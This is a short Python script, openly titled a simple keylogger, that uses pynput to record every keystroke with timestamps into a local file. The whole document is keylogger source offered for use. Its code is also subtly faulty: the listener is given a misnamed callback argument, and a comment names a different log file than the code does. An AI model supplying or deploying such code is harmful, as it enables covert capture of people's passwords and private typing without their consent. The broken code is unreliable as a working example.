# A simple python keylogger 

"""
A simple keylooger in python. 
v 1.0 

pre-requisites : pynput 

"""

# import simple required libraries. 
# pynput - help to read the keystrokes as the user types in data, logging - log the key strokes into a file. 

from pynput.keyboard import Key, Listener 
import logging 


# Basic log configuration 

'''

Here, we create basic configuration for the logging system.
 We specify the filename where keystrokes will be recorded as keylog.txt followed by specifying the format in which the keystrokes will be stored, 
 which in this case would be YY-MM-DD HH-MM-SS(ms) is the KEY.

'''
logging.basicConfig(filename=("KEYLOGGER.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Defining the function for logging the data 

def logkey(key):
    logging.info(str(key)); 


# Listen to the key strokes 
with Listener(logkey=logkey) as listener :
    listener.join()
    